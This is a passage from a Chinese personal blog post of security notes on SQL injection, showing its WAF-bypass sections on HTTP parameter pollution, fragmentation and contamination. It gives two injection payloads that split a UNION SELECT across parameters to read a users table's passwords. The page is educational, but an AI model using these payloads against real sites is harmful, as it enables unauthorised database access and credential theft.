<h3 id="HPP-重复参数污染-HTTP-Parameter-Polution"><a href="#HPP-重复参数污染-HTTP-Parameter-Polution" class="headerlink" title="HPP(重复参数污染)HTTP Parameter Polution"></a>HPP(重复参数污染)HTTP Parameter Polution</h3><p>payload<br><code>id=1;select+1&amp;id=2,3+from+users+where+id=1—</code><br>就是uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式如下：<br>| Web 服务器        | 对参数的解释    |  举例  |<br>    | ——–   | —–:   | :—-: |<br>    | ASP.NET/IIS        | 会以逗号连接     |   uid=1,2,3    |<br>    | ASP/IIS       | 会以逗号连接      |   uid=1,2,3    |<br>    | PHP/Apache        | 将最后一个参数作为获取的结果     |   uid=3    |<br>    | JSP/Tomcat      | 将第一个参数作为获取的结果      |   uid=1    |<br>    | Perl/Apache        | 将第一个参数作为获取的结果      |   uid=1    |<br>    |DNMan         |   使用两个波浪号进行连接     |  uid=1<del>2</del>3      |</p>
<h3 id="HPF-HTTP-Parameter-Fragment"><a href="#HPF-HTTP-Parameter-Fragment" class="headerlink" title="HPF(HTTP Parameter Fragment)"></a>HPF(HTTP Parameter Fragment)</h3><p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0b等执行换行)<br>payload<br><code>a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code><br>这里与HPP的不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p>
<h3 id="HPC-HTTP-Parameter-Contamination"><a href="#HPC-HTTP-Parameter-Contamination" class="headerlink" title="HPC(HTTP Parameter Contamination)"></a>HPC(HTTP Parameter Contamination)</h3><p>RFC2396定义了如下一些字符：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * <span class="string">' ()</span></div><div class="line"><span class="string">Reserved : ; / ? : @ &amp; = + $ ,</span></div><div class="line"><span class="string">Unwise : &#123; &#125; | \ ^ [ ] `</span></div></pre></td></tr></table></figure></p>
<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：<br><img src="http://ouz06keqs.bkt.clouddn.com/20171023-162451.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.jinglingshu.org/?p=4507" target="_blank" rel="external">关于Mysql注入过程中的五种报错方式及具体利用案例</a><br><a href="http://www.cnblogs.com/croot/p/3450262.html" target="_blank" rel="external">高级SQL注入：混淆和绕过</a><br><a href="http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="external">深入理解SQL注入绕过WAF和过滤机制</a></p>

      
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/10/23/SQL注入/">SQL注入整理(一)</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Merak 的个人博客">Merak</a></p>
        <p><span>发布时间:</span>2017年10月23日 - 16时44分</p>
        <p><span>最后更新:</span>2017年10月23日 - 04时44分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/10/23/SQL注入/" title="SQL注入整理(一)">http://www.Merak.cc/2017/10/23/SQL注入/</a>
            <span class="copy-path" data-clipboard-text="原文: http://www.Merak.cc/2017/10/23/SQL注入/　　作者: Merak" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2017/10/24/HTMLParser模块/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          HTMLParser模块
        
      </div>
    </a>
  
  
    <a href="/2017/10/20/列表/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">列表</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#盲注"><span class="toc-number">2.1.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Timing-Attack"><span class="toc-number">2.2.</span> <span class="toc-text">Timing Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入"><span class="toc-number">2.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#group-by"><span class="toc-number">2.3.1.</span> <span class="toc-text">group by</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UpdateXml"><span class="toc-number">2.3.2.</span> <span class="toc-text">UpdateXml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ExtractValue"><span class="toc-number">2.3.3.</span> <span class="toc-text">ExtractValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join"><span class="toc-number">2.3.4.</span> <span class="toc-text">join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据库测试备忘录"><span class="toc-number">2.3.5.</span> <span class="toc-text">数据库测试备忘录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据回显的注入流程"><span class="toc-number">2.4.</span> <span class="toc-text">数据回显的注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试查询字段数"><span class="toc-number">2.4.1.</span> <span class="toc-text">测试查询字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定显示位"><span class="toc-number">2.4.2.</span> <span class="toc-text">确定显示位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询数据库名"><span class="toc-number">2.4.3.</span> <span class="toc-text">查询数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询表名"><span class="toc-number">2.4.4.</span> <span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询列名"><span class="toc-number">2.4.5.</span> <span class="toc-text">查询列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据"><span class="toc-number">2.4.6.</span> <span class="toc-text">爆数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-number">3.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过函数与关键词过滤"><span class="toc-number">3.1.</span> <span class="toc-text">绕过函数与关键词过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#表结构"><span class="toc-number">3.2.</span> <span class="toc-text">表结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and，or"><span class="toc-number">3.3.</span> <span class="toc-text">and，or</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union"><span class="toc-number">3.4.</span> <span class="toc-text">and,or,union</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where"><span class="toc-number">3.5.</span> <span class="toc-text">and,or,union,where</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where-limit"><span class="toc-number">3.6.</span> <span class="toc-text">and,or,union,where,limit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where-limit-group-by"><span class="toc-number">3.7.</span> <span class="toc-text">and,or,union,where,limit,group by</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where-limit-group-by-select"><span class="toc-number">3.8.</span> <span class="toc-text">and,or,union,where,limit,group by,select</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where-limit-goup-by-select-’-hex"><span class="toc-number">3.9.</span> <span class="toc-text">and,or,union,where,limit,goup by,select,’,hex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#and-or-union-where-limit-group-by-select-’-hex-substr-空格"><span class="toc-number">3.10.</span> <span class="toc-text">and,or,union,where,limit,group by,select,’,hex,substr,空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过WAF的一些方法"><span class="toc-number">3.11.</span> <span class="toc-text">绕过WAF的一些方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注释绕过"><span class="toc-number">3.11.1.</span> <span class="toc-text">注释绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#普通注释"><span class="toc-number">3.11.1.1.</span> <span class="toc-text">普通注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内联注释"><span class="toc-number">3.11.1.2.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变换大小写"><span class="toc-number">3.11.2.</span> <span class="toc-text">变换大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过空格过滤"><span class="toc-number">3.11.3.</span> <span class="toc-text">绕过空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符编码绕过"><span class="toc-number">3.11.4.</span> <span class="toc-text">字符编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#url编码绕过"><span class="toc-number">3.11.4.1.</span> <span class="toc-text">url编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#十六进制编码"><span class="toc-number">3.11.4.2.</span> <span class="toc-text">十六进制编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicode编码"><span class="toc-number">3.11.4.3.</span> <span class="toc-text">Unicode编码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特殊符号"><span class="toc-number">3.11.5.</span> <span class="toc-text">特殊符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#等价函数收集"><span class="toc-number">3.11.6.</span> <span class="toc-text">等价函数收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HPP-重复参数污染-HTTP-Parameter-Polution"><span class="toc-number">3.11.7.</span> <span class="toc-text">HPP(重复参数污染)HTTP Parameter Polution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HPF-HTTP-Parameter-Fragment"><span class="toc-number">3.11.8.</span> <span class="toc-text">HPF(HTTP Parameter Fragment)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HPC-HTTP-Parameter-Contamination"><span class="toc-number">3.11.9.</span> <span class="toc-text">HPC(HTTP Parameter Contamination)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/10/24/HTMLParser模块/" title="上一篇: HTMLParser模块">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2017/10/20/列表/" title="下一篇: 列表">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/05/28/python-importlib/">importlib动态加载模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/某扫描器/">某扫描器</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/惊蛰漏洞扫描平台分析/">惊蛰漏洞扫描平台分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/07/加密/">加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/06/JSON处理/">JSON处理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/03/网络编程/">网络编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/02/windows采用命令/">常用的windows命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/31/byte与rune/">rune与byte</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/28/数组与字典/">数组与数组切片</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/Python3笔记/">Python3 学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/03/python基础/">python基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/数据链路层/">数据链路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/01/网络基础/">网络基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/01/tcp-ip简介/">tcp/ip简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/24/HTMLParser模块/">HTMLParser模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/23/SQL注入/">SQL注入整理(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/20/列表/">列表</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/偏函数/">偏函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/18/with上下文管理器/">上下文管理器与with语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/v2ray/">v2ray 配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/socket-python/">socket编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/28/正则表达式/">正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/15/s2-053/">S2-053</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/10/golang流程控制/">流程控制</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/10/Strut2 常见POC/">Struts2 常见POC收集和整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/论事件驱动与异步IO/">论事件驱动与异步IO[转]</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/并发编程/">并发编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/Python常用模块2/">python常用模块(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/Python常用模块/">python常用模块(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/python TCP代理/">python TCP代理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/hexo+github+nginx VPS搭建博客/">hexo+github+nginx vps搭建博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/go语言初识/">初识go语言</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/05/goroutine与调度器/">goroutine与调度器[转]</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2018 Merak
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >道士到访数: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">本页阅读量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>